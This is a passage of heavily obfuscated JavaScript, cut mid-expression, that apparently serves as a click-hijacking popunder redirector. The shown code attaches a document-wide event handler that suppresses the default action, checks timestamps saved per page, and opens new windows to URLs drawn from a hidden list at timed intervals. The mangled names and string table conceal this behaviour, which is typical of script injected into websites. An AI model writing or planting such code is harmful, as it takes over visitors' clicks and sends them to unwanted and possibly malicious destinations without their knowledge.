_0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());